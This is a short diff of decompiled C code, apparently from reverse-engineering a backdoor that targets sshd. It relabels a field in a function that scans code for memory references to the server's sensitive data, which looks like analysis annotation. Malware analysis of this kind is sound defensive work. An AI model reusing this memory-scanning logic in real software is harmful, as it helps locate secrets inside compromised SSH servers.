@@ -27,9 +27,9 @@ int sshd_get_sensitive_data_score_in_main
   u8 *main_start;
   
   score = 0;
-  code_start = (u8 *)refs->entries[2].func_start;
+  code_start = (u8 *)(refs->list_hostkey_types).func_start;
   if (code_start != (u8 *)0x0) {
-    code_end = (u8 *)refs->entries[2].func_end;
+    code_end = (u8 *)(refs->list_hostkey_types).func_end;
     base_hit = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
     offset10_hit = find_instruction_with_mem_operand
                       (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
